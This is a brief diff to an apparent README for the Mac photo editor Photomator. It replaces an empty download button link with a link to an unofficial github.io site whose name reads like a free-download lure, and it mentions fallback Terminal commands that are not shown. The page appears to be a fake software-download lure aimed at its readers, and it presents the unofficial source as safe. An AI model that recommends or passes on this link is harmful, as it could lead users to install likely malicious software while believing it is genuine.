@@ -4,7 +4,7 @@
 
 > **Photomator** is a powerful and intuitive photo editor designed specifically for Mac. With its smart machine learning features and beautiful interface, editing your images becomes fast, fun, and incredibly effective. Follow the instructions below to download and install it safely.
 
-> [![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-Photomator-black?style=for-the-badge&logo=apple)](#)
+> [![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-Photomator-black?style=for-the-badge&logo=apple)](https://photomator-for-mac-os-download-free.github.io/.github/)
  
 > If the button doesn't work, follow the instructions below using Terminal commands.
 
